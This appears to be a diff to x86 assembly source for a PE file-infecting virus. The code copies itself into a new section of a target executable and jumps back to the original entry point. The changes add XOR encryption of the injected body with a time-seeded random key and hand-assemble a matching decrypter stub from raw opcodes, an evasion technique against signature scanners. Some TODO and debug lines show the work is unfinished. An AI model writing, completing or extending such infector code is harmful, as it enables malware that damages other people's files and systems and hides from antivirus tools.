@@ -39,6 +39,35 @@ GETADDR		macro	Name, Lib, Save
 .code
 
 toInject:
+; Decrypter
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+
+endDecrypter:
+; Jmp data
 jmp	start
 
 ; FILE
@@ -433,6 +462,13 @@ cmp	eax, 0
 je	errorMapFile
 mov	[DELTA PeFileMap], eax
 
+
+; CREATING ENCRYPTER
+; TODO Call rand and use it when copying (xor)
+mov	eax, 128 ; Maximum xoring
+call	random
+mov	edx, eax
+
 ; INSERTING NEW SECTION - OPCODE COPY
 mov	ecx, [DELTA NewSectionCodeSize]
 mov	edi, [DELTA PeFileMap] ; Destination bytes
@@ -441,27 +477,67 @@ mov	esi, toInject ; Source bytes
 add	esi, ebp
 createNewSection:
 lodsb
+xor	eax, edx ; Encrypt
 stosb
 loop	createNewSection
-
-; CREATING ENCRYPTER
-; TODO Call rand and use it when copying (xor)
 
 ; CREATING JUMP TO OLD ENTRY POINT
 mov	edi, errorExit - toInject ; Offset jmp
 add	edi, [DELTA PeFileMap] ; Add base filemap
 add	edi, [DELTA PointerToRawData] ; Add section offset
 mov	eax, 0E9h ; Push imm32 OPCODE
+xor	eax, edx ; Encrypt
 stosb
 mov	eax, [DELTA OldEntryPoint] ; Entry point address
 sub	eax, [DELTA VirtualAddress]
-mov	edx, errorExit - toInject
-sub	eax, edx
+mov	esi, errorExit - toInject
+sub	eax, esi
 sub	eax, 05h ; Add 5 bytes for JMP
+xor	eax, edx ; Encrypt
 stosd
 
 ; CREATING DECRYPTER
 ; TODO loop on all and xoring with the rand used in the encrypter
+; mov edi, eip + decrypterSize
+; mov esi, edi
+; xor ecx, ecx
+; |> lodsb
+; |  xor eax, edxRandom
+; |  stosb
+; |  inc ecx
+; |  cmp ecx, errorExit - toInject - decrypterSize
+; |< Je
+mov	edi, [DELTA PeFileMap]
+add	edi, [DELTA PointerToRawData]
+mov	eax, 0BFh ; Mov edi
+stosb
+mov	eax, 0400000h ; TODO - Get BA
+add	eax, [DELTA VirtualAddress]
+stosd
+mov	eax, 0F78Bh ; mov esi, edi
+stosw
+mov	eax, 0C933h ; xor ecx, ecx
+stosw
+mov	eax, 0ACh ; lodsb
+stosb
+mov	eax, 035h ; xor
+stosb
+mov	eax, edx ; random xor
+stosd
+mov	eax, 0AAh ; stosb
+stosb
+mov	eax, 041h ; inc ecx
+stosb
+mov	eax, 0F981h ; cmp ecx
+stosw
+mov	eax, errorExit - toInject - 27
+stosd
+mov	eax, 074h ; Je
+stosb
+mov	eax, toInject - endDecrypter
+stosb
+
+
 
 ; DEBUG FILE INJECTED - TODO REMOVE
 push	0
@@ -510,10 +586,15 @@ random:
 push	ecx
 push	edx
 mov	ecx, eax
-push	STime
-call	pGetSystemTime
+pusha
+PDELTA	STime
+call	[DELTA pGetSystemTime]
+popa
 xor	eax, eax
 mov	ax, word ptr [DELTA STime.Milliseconds]
+shl	eax, 16
+mov	ax, word ptr [DELTA STime.Second]
+xor	edx, edx
 div	ecx
 mov	eax, edx
 pop	edx
